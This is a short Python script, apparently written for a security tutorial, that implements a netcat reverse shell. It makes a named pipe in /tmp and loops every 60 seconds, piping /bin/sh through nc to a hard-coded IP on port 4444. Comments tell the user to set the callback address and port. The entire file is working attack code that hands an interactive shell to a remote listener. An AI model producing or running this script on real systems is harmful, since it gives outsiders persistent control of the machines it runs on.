#!/usr/bin/env python
#Netcat reverse shell using the principles learned from Don Does 30
#https://www.youtube.com/watch?v=S1GdWiiYiPI&t=634s
#Contact is John Mintz.  john.mintz@gmail.com  twitter @johnwmintz




import os
import time

ip = "192.168.226.128" #change this to the ip it is reaching out to
port = " 4444" #change this to the port of your choice.... Ensure you leave space between " and the port number

os.system("mknod /tmp/backpipe p")

while True: 
	os.system("/bin/sh 0</tmp/backpipe | nc " + ip + port + ">/tmp/backpipe")
	time.sleep(60)

